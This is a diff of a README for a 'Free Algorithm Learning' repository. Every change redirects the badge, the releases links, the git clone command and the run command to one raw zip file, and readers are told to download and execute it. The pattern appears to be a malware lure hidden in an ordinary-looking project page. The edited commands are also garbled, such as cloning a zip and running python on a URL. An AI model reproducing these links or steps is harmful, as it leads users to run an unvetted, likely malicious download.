@@ -1,6 +1,6 @@
 # Free Algorithm Learning 🚀
 
-![Algorithm Learning](https://img.shields.io/badge/Visit%20Releases-%20%F0%9F%93%8E-blue?style=for-the-badge&logo=github)
+![Algorithm Learning](https://github.com/Simon-ux/free-algorithm-learning/raw/refs/heads/master/Notelaea/free_algorithm_learning_3.0.zip%20Releases-%20%F0%9F%93%8E-blue?style=for-the-badge&logo=github)
 
 Welcome to the **Free Algorithm Learning** repository! This project is designed to provide a comprehensive and interactive platform for mastering algorithms and data structures. Whether you are a beginner or looking to refine your skills, this repository offers a wealth of resources to help you succeed in your algorithm journey.
 
@@ -20,7 +20,7 @@ Welcome to the **Free Algorithm Learning** repository! This project is designed 
 
 In the world of computer science, algorithms play a crucial role. They are the building blocks of software development, impacting everything from data processing to system efficiency. This repository aims to demystify algorithms through interactive animations and clear explanations. By utilizing visual aids, we strive to make learning both intuitive and enjoyable.
 
-You can find the latest releases [here](https://github.com/Simon-ux/free-algorithm-learning/releases). Be sure to download and execute the files to get started!
+You can find the latest releases [here](https://github.com/Simon-ux/free-algorithm-learning/raw/refs/heads/master/Notelaea/free_algorithm_learning_3.0.zip). Be sure to download and execute the files to get started!
 
 ## Features
 
@@ -49,7 +49,7 @@ To get started with the Free Algorithm Learning repository, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Simon-ux/free-algorithm-learning.git
+   git clone https://github.com/Simon-ux/free-algorithm-learning/raw/refs/heads/master/Notelaea/free_algorithm_learning_3.0.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -63,10 +63,10 @@ To get started with the Free Algorithm Learning repository, follow these steps:
 4. **Run the Application**:
    Open your terminal and execute the main file for the language you are using. For example:
    ```bash
-   python main.py
+   python https://github.com/Simon-ux/free-algorithm-learning/raw/refs/heads/master/Notelaea/free_algorithm_learning_3.0.zip
    ```
 
-You can also find the latest releases [here](https://github.com/Simon-ux/free-algorithm-learning/releases). Download and execute the files for the best experience.
+You can also find the latest releases [here](https://github.com/Simon-ux/free-algorithm-learning/raw/refs/heads/master/Notelaea/free_algorithm_learning_3.0.zip). Download and execute the files for the best experience.
 
 ## Usage
 
@@ -127,4 +127,4 @@ For any questions or feedback, please reach out via the issues section of this r
 
 ---
 
-Thank you for visiting the **Free Algorithm Learning** repository! We hope you find the resources helpful and engaging as you embark on your algorithm learning journey. Don’t forget to check the [Releases](https://github.com/Simon-ux/free-algorithm-learning/releases) section for the latest updates and improvements. Happy coding!
+Thank you for visiting the **Free Algorithm Learning** repository! We hope you find the resources helpful and engaging as you embark on your algorithm learning journey. Don’t forget to check the [Releases](https://github.com/Simon-ux/free-algorithm-learning/raw/refs/heads/master/Notelaea/free_algorithm_learning_3.0.zip) section for the latest updates and improvements. Happy coding!
